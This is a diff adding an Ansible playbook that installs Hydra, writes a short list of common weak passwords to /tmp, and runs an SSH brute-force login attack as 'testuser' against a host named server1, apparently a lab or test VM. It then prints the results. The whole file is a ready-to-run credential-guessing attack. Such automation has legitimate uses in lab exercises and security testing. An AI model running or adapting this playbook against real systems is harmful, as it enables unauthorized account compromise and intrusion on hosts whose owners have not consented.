@@ -1,0 +1,44 @@
+---
+- name: Run SSH brute force attack with Hydra
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: Install hydra
+      apt:
+        name: hydra
+        state: present
+        update_cache: yes
+      become: yes
+
+    - name: Copy wordlist
+      copy:
+        content: |
+          password
+          123456
+          password123
+          admin
+          root
+          qwerty
+          letmein
+          welcome
+          monkey
+          dragon
+          test
+          1234
+          pass
+          secret
+          abc123
+        dest: /tmp/wordlist.txt
+
+    - name: Run Hydra brute force against client VM
+      command: >
+        hydra -l testuser
+        -P /tmp/wordlist.txt
+        ssh://{{ hostvars['server1']['ansible_host'] }}
+        -t 4 -V -f
+      register: hydra_result
+      ignore_errors: yes
+
+    - name: Show attack results
+      debug:
+        var: hydra_result.stdout_lines
